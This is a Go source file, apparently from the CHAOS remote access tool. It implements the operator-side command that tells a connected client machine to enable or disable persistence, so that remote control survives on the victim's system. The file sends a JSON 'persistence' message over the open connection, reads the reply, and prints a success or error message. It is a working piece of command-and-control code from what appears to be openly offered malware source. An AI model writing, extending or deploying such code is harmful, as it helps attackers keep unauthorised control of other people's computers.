package persistence

import (
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
	"strings"
)

type PersistenceUseCase struct {
	Connection net.Conn
}

func NewPersistenceUseCase(conn net.Conn) usecase.Persistence {
	return &PersistenceUseCase{
		Connection: conn,
	}
}

func (p PersistenceUseCase) Validate(param []string) error {
	if !util.Contains(param, "enable") && !util.Contains(param, "disable") {
		return fmt.Errorf("invalid parameters")
	}
	return nil
}

func (p PersistenceUseCase) Persist(status string) error {
	var persistenceStatus bool
	switch strings.TrimSpace(status) {
	case "enable":
		persistenceStatus = true
	case "disable":
		persistenceStatus = false
	default:
		return fmt.Errorf("invalid parameter %s", status)
	}

	persistence, err := json.Marshal(models.Persistence{
		Status: persistenceStatus,
	})

	err = network.Send(p.Connection, models.Message{
		Command: "persistence",
		Data:    persistence,
	})
	if err != nil {
		log.WithField("cause", err.Error()).Error("error sending request")
		return err
	}

	response, err := network.Read(p.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response")
		return err
	}
	if response.Error.HasError {
		fmt.Println(color.Red, "[!] Error on", status, "persistence!", response.Error.Message)
		return err

	}

	switch strings.TrimSpace(status) {
	case "enable":
		fmt.Println(color.Green, "[*] Persistence enabled successfully!")
	case "disable":
		fmt.Println(color.Green, "[*] Persistence disabled successfully!")
	}
	return nil
}
